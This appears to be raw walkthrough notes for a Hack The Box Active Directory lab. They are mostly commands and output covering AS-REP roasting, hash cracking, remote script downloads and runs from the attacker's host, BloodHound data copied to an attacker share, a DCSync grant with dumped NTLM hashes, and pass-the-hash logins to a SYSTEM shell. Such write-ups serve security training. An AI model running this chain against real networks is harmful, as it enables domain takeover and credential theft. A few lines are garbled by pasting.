@@ -1,0 +1,477 @@
+53/tcp    open  domain       (generic dns response: SERVFAIL)
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-09-20 19:32:19Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+49706/tcp open  msrpc        Microsoft Windows RPC
+49980/tcp open  msrpc        Microsoft Windows RPC
+
+
+
+ldapsearch -H ldaps://htb.local:636/ -x -s base -b '' "(objectClass=*)" "*" +
+
+└─$ ldapsearch -x -H ldap://10.10.10.161 -s base namingContexts
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingContexts 
+#
+
+#
+dn:
+namingContexts: DC=htb,DC=local
+namingContexts: CN=Configuration,DC=htb,DC=local
+namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
+namingContexts: DC=DomainDnsZones,DC=htb,DC=local
+namingContexts: DC=ForestDnsZones,DC=htb,DC=local
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+
+
+
+└─$ ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" "(objectClass=person)" cn
+# extended LDIF
+#
+# LDAPv3
+# base <DC=htb,DC=local> with scope subtree
+# filter: (objectClass=person)
+# requesting: cn 
+#
+
+# Guest, Users, htb.local
+dn: CN=Guest,CN=Users,DC=htb,DC=local
+cn: Guest
+
+# DefaultAccount, Users, htb.local
+dn: CN=DefaultAccount,CN=Users,DC=htb,DC=local
+cn: DefaultAccount
+
+# FOREST, Domain Controllers, htb.local
+dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
+cn: FOREST
+
+# EXCH01, Computers, htb.local
+dn: CN=EXCH01,CN=Computers,DC=htb,DC=local
+cn: EXCH01
+
+# Exchange Online-ApplicationAccount, Users, htb.local
+dn: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local
+cn: Exchange Online-ApplicationAccount
+
+# SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}, Users, htb.local
+dn: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=
+ local
+cn: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
+
+# SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}, Users, htb.local
+dn: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=htb,DC=
+ local
+cn: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
+
+# SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}, Users, htb.local
+dn: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=htb,DC=
+ local
+cn: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
+
+# DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}, Users, htb.loc
+ al
+dn: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,
+ DC=htb,DC=local
+cn: DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}
+
+# Migration.8f3e7716-2011-43e4-96b1-aba62d229136, Users, htb.local
+dn: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=htb,DC=local
+cn: Migration.8f3e7716-2011-43e4-96b1-aba62d229136
+
+# FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042, Users, htb.local
+dn: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=htb,DC=
+ local
+cn: FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042
+
+# SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}, Users, htb.local
+dn: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=htb,DC=
+ local
+cn: SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}
+
+# SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}, Users, htb.local
+dn: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=Users,DC=htb,DC=
+ local
+cn: SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}
+
+# SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}, Users, htb.localldap://10.10.10.161 -b "DC=htb,DC=local"
+dn: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=Users,DC=htb,DC=
+ local
+cn: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}
+
+# HealthMailboxc3d7722415ad41a5b19e3e00e165edbe, Monitoring Mailboxes, Microsof
+ t Exchange System Objects, htb.local
+dn: CN=HealthMailboxc3d7722415ad41a5b19e3e00e165edbe,CN=Monitoring Mailboxes,C
+ N=Microsoft Exchange System Objects,DC=htb,DC=local
+cn: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe
+
+# HealthMailboxfc9daad117b84fe08b081886bd8a5a50, Monitoring Mailboxes, Microsof
+ t Exchange System Objects, htb.local
+dn: CN=HealthMailboxfc9daad117b84fe08b081886bd8a5a50,CN=Monitoring Mailboxes,C
+ N=Microsoft Exchange System Objects,DC=htb,DC=local
+cn: HealthMailboxfc9daad117b84fe08b081886bd8a5a50
+
+# HealthMailboxc0a90c97d4994429b15003d6a518f3f5, Monitoring Mailboxes, Microsof
+ t Exchange System Objects, htb.local
+dn: CN=HealthMailboxc0a90c97d4994429b15003d6a518f3f5,CN=Monitoring Mailboxes,C
+ N=Microsoft Exchange System Objects,DC=htb,DC=local
+cn: HealthMailboxc0a90c97d4994429b15003d6a518f3f5
+
+# HealthMailbox670628ec4dd64321acfdf6e67db3a2d8, Monitoring Mailboxes, Microsof
+ t Exchange System Objects, htb.local
+dn: CN=HealthMailbox670628ec4dd64321acfdf6e67db3a2d8,CN=Monitoring Mailboxes,C
+ N=Microsoft Exchange System Objects,DC=htb,DC=local
+cn: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8
+
+# HealthMailbox968e74dd3edb414cb4018376e7dd95ba, Monitoring Mailboxes, Microsof
+ t Exchange System Objects, htb.local
+dn: CN=HealthMailbox968e74dd3edb414cb4018376e7dd95ba,CN=Monitoring Mailboxes,C
+ N=Microsoft Exchange System Objects,DC=htb,DC=local
+cn: HealthMailbox968e74dd3edb414cb4018376e7dd95ba
+
+# HealthMailbox6ded67848a234577a1756e072081d01f, Monitoring Mailboxes, Microsof
+ t Exchange System Objects, htb.local
+dn: CN=HealthMailbox6ded67848a234577a1756e072081d01f,CN=Monitoring Mailboxes,C
+ N=Microsoft Exchange System Objects,DC=htb,DC=local
+cn: HealthMailbox6ded67848a234577a1756e072081d01f
+
+# HealthMailbox83d6781be36b4bbf8893b03c2ee379ab, Monitoring Mailboxes, Microsof
+ t Exchange System Objects, htb.local
+dn: CN=HealthMailbox83d6781be36b4bbf8893b03c2ee379ab,CN=Monitoring Mailboxes,C
+ N=Microsoft Exchange System Objects,DC=htb,DC=local
+cn: HealthMailbox83d6781be36b4bbf8893b03c2ee379ab
+
+# HealthMailboxfd87238e536e49e08738480d300e3772, Monitoring Mailboxes, Microsof
+ t Exchange System Objects, htb.local
+dn: CN=HealthMailboxfd87238e536e49e08738480d300e3772,CN=Monitoring Mailboxes,C
+ N=Microsoft Exchange System Objects,DC=htb,DC=local
+cn: HealthMailboxfd87238e536e49e08738480d300e3772
+
+# HealthMailboxb01ac647a64648d2a5fa21df27058a24, Monitoring Mailboxes, Microsof
+ t Exchange System Objects, htb.local
+dn: CN=HealthMailboxb01ac647a64648d2a5fa21df27058a24,CN=Monitoring Mailboxes,C
+ N=Microsoft Exchange System Objects,DC=htb,DC=local
+cn: HealthMailboxb01ac647a64648d2a5fa21df27058a24
+
+# HealthMailbox7108a4e350f84b32a7a90d8e718f78cf, Monitoring Mailboxes, Microsof
+ t Exchange System Objects, htb.local
+dn: CN=HealthMailbox7108a4e350f84b32a7a90d8e718f78cf,CN=Monitoring Mailboxes,C
+ N=Microsoft Exchange System Objects,DC=htb,DC=local
+cn: HealthMailbox7108a4e350f84b32a7a90d8e718f78cf
+
+# HealthMailbox0659cc188f4c4f9f978f6c2142c4181e, Monitoring Mailboxes, Microsof
+ t Exchange System Objects, htb.local
+dn: CN=HealthMailbox0659cc188f4c4f9f978f6c2142c4181e,CN=Monitoring Mailboxes,C
+ N=Microsoft Exchange System Objects,DC=htb,DC=local
+cn: HealthMailbox0659cc188f4c4f9f978f6c2142c4181e
+
+# Sebastien Caron, Exchange Administrators, Information Technology, Employees, 
+ htb.local
+dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
+ =Employees,DC=htb,DC=local
+cn: Sebastien Caron
+
+# Lucinda Berger, IT Management, Information Technology, Employees, htb.local
+dn: CN=Lucinda Berger,OU=IT Management,OU=Information Technology,OU=Employees,
+ DC=htb,DC=local
+cn: Lucinda Berger
+
+# Andy Hislip, Helpdesk, Information Technology, Employees, htb.local
+dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
+ C=local
+cn: Andy Hislip
+
+# Mark Brandt, Sysadmins, Information Technology, Employees, htb.local
+dn: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,
+ DC=local
+cn: Mark Brandt
+
+# Santi Rodriguez, Developers, Information Technology, Employees, htb.local
+dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC
+ =htb,DC=local
+cn: Santi Rodriguez
+
+# ippsec, Users, htb.local
+dn: CN=ippsec,CN=Users,DC=htb,DC=local
+cn: ippsec
+
+# search reference
+ref: ldap://ForestDnsZones.htb.local/DC=ForestDnsZones,DC=htb,DC=local
+
+# search reference
+ref: ldap://DomainDnsZones.htb.local/DC=DomainDnsZones,DC=htb,DC=local
+
+# search reference
+ref: ldap://htb.local/CN=Configuration,DC=htb,DC=local
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 35
+# numEntries: 31
+# numReferences: 3
+
+
+ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" "(objectClass=user)" cn sAMAccountName
+
+# Sebastien Caron, Exchange Administrators, Information Technology, Employees, 
+ htb.local
+dn: CN=Sebastien Caron,OU=Exchange Administrators,OU=Information Technology,OU
+ =Employees,DC=htb,DC=local
+cn: Sebastien Caron
+sAMAccountName: sebastien
+
+# Lucinda Berger, IT Management, Information Technology, Employees, htb.local
+dn: CN=Lucinda Berger,OU=IT Management,OU=Information Technology,OU=Employees,
+ DC=htb,DC=local
+cn: Lucinda Berger
+sAMAccountName: lucinda
+
+# Andy Hislip, Helpdesk, Information Technology, Employees, htb.local
+dn: CN=Andy Hislip,OU=Helpdesk,OU=Information Technology,OU=Employees,DC=htb,D
+ C=local
+cn: Andy Hislip
+sAMAccountName: andy
+
+# Mark Brandt, Sysadmins, Information Technology, Employees, htb.local
+dn: CN=Mark Brandt,OU=Sysadmins,OU=Information Technology,OU=Employees,DC=htb,
+ DC=local
+cn: Mark Brandt
+sAMAccountName: mark
+
+# Santi Rodriguez, Developers, Information Technology, Employees, htb.local
+dn: CN=Santi Rodriguez,OU=Developers,OU=Information Technology,OU=Employees,DC
+ =htb,DC=local
+cn: Santi Rodriguez
+sAMAccountName: santi
+
+# ippsec, Users, htb.local
+dn: CN=ippsec,CN=Users,DC=htb,DC=local
+cn: ippsec
+sAMAccountName: ippsec
+
+
+//create a user list
+
+
+└─$ impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile user.txt -format hashcat -output hash.txt
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User ippsec doesn't have UF_DONT_REQUIRE_PREAUTH set
+
+
+enum4linux 10.10.10.161
+
+=======================================( Users on 10.10.10.161 )
+index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco	Name: svc-alfresco	Desc: (null)
+
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[$331000-VK4ADACQNUCA] rid:[0x463]
+user:[SM_2c8eef0a09b545acb] rid:[0x464]
+user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
+user:[SM_75a538d3025e4db9a] rid:[0x466]
+user:[SM_681f53d4942840e18] rid:[0x467]
+user:[SM_1b41c9286325456bb] rid:[0x468]
+user:[SM_9b69f1b9d2cc45549] rid:[0x469]
+user:[SM_7c96b981967141ebb] rid:[0x46a]
+user:[SM_c75ee099d0a64c91b] rid:[0x46b]
+user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
+user:[HealthMailboxc3d7722] rid:[0x46e]
+user:[HealthMailboxfc9daad] rid:[0x46f]
+user:[HealthMailboxc0a90c9] rid:[0x470]
+user:[HealthMailbox670628e] rid:[0x471]
+user:[HealthMailbox968e74d] rid:[0x472]
+user:[HealthMailbox6ded678] rid:[0x473]
+user:[HealthMailbox83d6781] rid:[0x474]
+user:[HealthMailboxfd87238] rid:[0x475]
+user:[HealthMailboxb01ac64] rid:[0x476]
+user:[HealthMailbox7108a4e] rid:[0x477]
+user:[HealthMailbox0659cc1] rid:[0x478]
+user:[sebastien] rid:[0x479]
+user:[lucinda] rid:[0x47a]
+user:[svc-alfresco] rid:[0x47b]
+user:[andy] rid:[0x47e]
+user:[mark] rid:[0x47f]
+user:[santi] rid:[0x480]
+user:[ippsec] rid:[0x2581]
+
+//let's add Administrator guest svc-alfresco into user.txt
+
+└─$ impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile user.txt -format hashcat -output hash.txt 
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:b63bda452740c9fed8ef66ae5818e023$46d7259a2e7be0ebd5393d19163b5b5e003e991b39282573ff287a67ae42ed1a1385e9e23468f8a3184fba36481c38cb598c95f5bfca9c2ca5593be60e215388d76cdb26bbe4cce3edf82731ddcee39ff9925a1bcb44f24bd86e52e5df3fdcf8877182b5553a2a7135397ef0d1426057beb17679a5517dd516061ea4f3dea223d398cb364754df1305533256705cde57605b182cb57a8f3c642ad75ae213b8905edf0b98ce5d50c912deb0df129870be2c4f494fae3c2896ba4cb782c125b1959cb09169d99ee84dcb074d8ef89a8639fba087885d805fdf7e16437299df79344b37ef39b9b2
+
+https://gist.github.com/CalfCrusher/6b87a738d0fe7b88e04f4a36eb6d722d to identify the type of hashcat- 18200
+
+
+hashcat -m 18200 hash.txt ~/oscp/rockyou.txt   //s3rvice
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:b63bda452740c9fed8ef66ae5818e023$46d7259a2e7be0ebd5393d19163b5b5e003e991b39282573ff287a67ae42ed1a1385e9e23468f8a3184fba36481c38cb598c95f5bfca9c2ca5593be60e215388d76cdb26bbe4cce3edf82731ddcee39ff9925a1bcb44f24bd86e52e5df3fdcf8877182b5553a2a7135397ef0d1426057beb17679a5517dd516061ea4f3dea223d398cb364754df1305533256705cde57605b182cb57a8f3c642ad75ae213b8905edf0b98ce5d50c912deb0df129870be2c4f494fae3c2896ba4cb782c125b1959cb09169d99ee84dcb074d8ef89a8639fba087885d805fdf7e16437299df79344b37ef39b9b2:s3rvice
+
+evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
+76eace449785479be7af
+
+
+Get-ComputerInfo
+
+WindowsBuildLabEx                                       : 14393.2273.amd64fre.rs1_release_1.180427-1811
+WindowsCurrentVersion                                   : 6.3
+WindowsEditionId                                        : ServerStandard
+WindowsInstallationType                                 : Server Core
+WindowsInstallDateFromRegistry                          : 9/18/2019 5:07:59 PM
+WindowsProductId                                        : 00376-30821-30176-AA930
+WindowsProductName                                      : Windows Server 2016 Standard
+
+iex(new-object net.webclient).downloadstring("http://10.10.16.5/SharpHound.exe")
+
+.\SharpHound.exe -c ALL -d htb.local --ldapusername svc-alfresco --ldappassword s3rvice
+
+iex(new-object net.webclient).downloadstring("http://10.10.16.5:8000/nc64.exe")
+
+New-SmbMapping -RemotePath '\\10.10.16.5' -Username "test" -Password "test"
+
+Copy-Item -Path "20250920150137_BloodHound.zip"  -Destination "\\10.10.16.5\share\"
+
+//sv-alfredo - memof -> ippsec - memof -> exchange permission - writeDacl -> htb.local
+also memof -> prive IT account - memof -> account operator
+
+WriteDacl permissions serve various purposes depending on the type of Active Directory object involved. For example, when applied to a group, they allow attackers to add members to that group. Conversely, on a user object, these permissions grant full control over that user’s account. Likewise, when applied to a computer object, they enable complete control over the machine. Finally, applying WriteDacl to a domain object allows an attacker to perform a DCSync operation—a particularly dangerous privilege if exploited.\
+
+PS C:\Users\svc-alfresco\Desktop> net user ed password /add /domain  //add a new user, as 
+The command completed successfully.
+
+net group "Exchange Windows Permissions" /add ed
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user ed
+User name                    ed
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            9/20/2025 11:37:06 PM
+Password expires             Never
+Password changeable          9/21/2025 11:37:06 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Exchange Windows Perm*Domain Users
+The command completed successfully.
+
+//add this user to group exchange
+
+iex(new-object net.webclient).downloadstring('http://10.10.16.5:8000, PowerView.ps1') 
+
+iwr -uri http://10.10.16.5:8000/PowerView.ps1 -o p.ps1
+
+
+
+convertto-securestring 'password' -AsPlainText -Force
+
+$cred = New-Object System.Management.Automation.PSCredential('htb\ed', $pass)
+
+Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity ed -Rights DCSync //this is a command in powerview.ps1
+
+
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+
+└─$ impacket-psexec "Administrator"@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file XIRHqqMf.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service TqCY on 10.10.10.161.....
+[*] Starting service TqCY.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+
+ Directory of C:\Users\Administrator\Desktop
+
+09/23/2019  02:15 PM    <DIR>          .
+09/23/2019  02:15 PM    <DIR>          ..
+09/18/2025  08:58 AM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   9,662,885,888 bytes free
+
+tyC:\Users\Administrator\Desktop> pe root.txt
+
+
+//or use wmiexec.py
+└─$ wmiexec.py htb.local/Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+htb\administrator
